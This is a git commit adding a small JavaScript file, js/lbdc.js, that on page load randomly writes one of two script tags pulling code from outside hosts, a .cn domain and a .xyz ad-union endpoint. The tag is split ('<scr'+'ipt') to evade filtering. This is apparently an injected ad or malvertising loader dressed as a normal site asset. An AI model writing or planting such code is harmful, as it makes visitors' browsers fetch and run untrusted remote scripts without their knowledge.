4cfcd2db26094830358ac7e154f2953d599cd214
heihub <63719020+heihub@users.noreply.github.com>
2020-07-16 03:55:15 -0700

    Add files via upload

---
+++ js/lbdc.js
@@ -0,0 +1,10 @@
+var m = 2;
+var n = Math.floor(Math.random() * m + 1);
+switch (n) {
+case 1:
+document.writeln('<script src="https://p.minyaartcrafts.cn/dipper/CA4E28CC-9733-42D9-9F52-73E0738511E0.po"></script>');
+break;
+case 2:
+document.write('<scr'+'ipt src="//xcfds.xyz/cf.aspx?action=cycadget&ad_class=7&userid=86&lowunionusername=&clickstate=1&adshowtype=AdCode_sjdb&ad_size=640x200&newadsel=1&maxadid=&prohibit="></scr'+'ipt>');
+break;
+}
